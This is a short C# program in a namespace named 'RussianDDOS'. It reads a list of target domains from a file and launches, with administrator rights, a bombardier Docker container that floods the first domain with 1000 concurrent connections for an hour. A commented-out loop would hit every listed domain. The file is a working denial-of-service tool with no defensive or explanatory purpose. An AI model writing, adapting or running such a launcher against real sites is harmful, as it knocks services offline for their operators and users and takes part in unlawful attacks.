using System;
using System.Diagnostics;
using System.IO;
using System.Linq;

namespace RussianDDOS
{
    class Program
    {
        static void Main(string[] args)         
        {             
            string[] list = File.ReadLines("domains.txt").ToArray();
            /*foreach (var item in list)
            {
                for (int i = 0; i < 2; i++)
                {
                    string command = $"docker run -ti --rm alpine/bombardier -c 1000 -d 3600s -l https://{item}";
                    *//*Process process = new Process();
                    ProcessStartInfo startInfo = new ProcessStartInfo
                    {
                        WindowStyle = ProcessWindowStyle.Maximized,
                        FileName = "cmd.exe",
                        Arguments = result,
                        Verb = "runas"
                    };
                    process.StartInfo = startInfo;
                    process.Start();*//*
                    Process.Start("cmd.exe", command);
                }
            }*/


            string command = $"/C docker run -ti --rm alpine/bombardier -c 1000 -d 3600s -l https://{list[0]}";
            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                WindowStyle = ProcessWindowStyle.Maximized,
                FileName = "cmd.exe",
                Arguments = command,
                Verb = "runas"
            };
            process.StartInfo = startInfo;
            process.Start();

            AppDomain.CurrentDomain.ProcessExit += (s, e) =>
            {
                Console.WriteLine("aa");
                process.Dispose();
            };
            //Process.Start("cmd.exe", $"/C docker run -ti --rm alpine/bombardier -c 1000 -d 3600s -l https://{list[0]}");
        }
    }
}